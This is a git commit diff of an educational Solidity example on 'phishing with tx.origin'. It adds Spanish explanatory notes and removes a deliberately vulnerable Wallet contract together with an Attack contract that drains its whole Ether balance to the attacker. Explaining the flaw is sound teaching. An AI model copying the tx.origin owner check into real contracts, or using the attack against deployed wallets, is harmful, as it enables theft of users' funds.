895dfecd948e5b311b698a59fce9311571947166
lcadafalch <56115195+lcadafalch@users.noreply.github.com>
2023-08-17 11:20:25 +0200

    Update Phishing with tx.origin.sol

--- Phishing with tx.origin.sol
+++ Phishing with tx.origin.sol
@@ -1,33 +1,17 @@
+Suplantación de identidad con tx.origin // Phishing with tx.origins
+PARTIENDO DE LA BASE QUE : Si el contrato A llama a B y B llama a C, en C msg.sender es B y tx.origin es A.
+
+RESUMEN: A --> B 
+         B --> C MSG.SENDER = B, TX.ORIGIN = A.
+
+Vulnerabilidad
+Un contrato malintencionado puede engañar al propietario de un contrato para que llame a una función que solo el propietario debería poder llamar.
+
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.17;
- all Ether to Eve.
+ pragma solidity ^0.8.17;
+/*
+Wallet es un contrato simple en el que solo el propietario debe poder transferir
+Éter a otra dirección. Wallet.transfer() usa tx.origin para verificar que el
+la persona que llama es el propietario. Veamos cómo podemos hackear este contrato.
 */
 
-contract Wallet {
-    address public owner;
-
-    constructor() payable {
-        owner = msg.sender;
-    }
-
-    function transfer(address payable _to, uint _amount) public {
-        require(tx.origin == owner, "Not owner");
-
-        (bool sent, ) = _to.call{value: _amount}("");
-        require(sent, "Failed to send Ether");
-    }
-}
-
-contract Attack {
-    address payable public owner;
-    Wallet wallet;
-
-    constructor(Wallet _wallet) {
-        wallet = Wallet(_wallet);
-        owner = payable(msg.sender);
-    }
-
-    function attack() public {
-        wallet.transfer(owner, address(wallet).balance);
-    }
-}
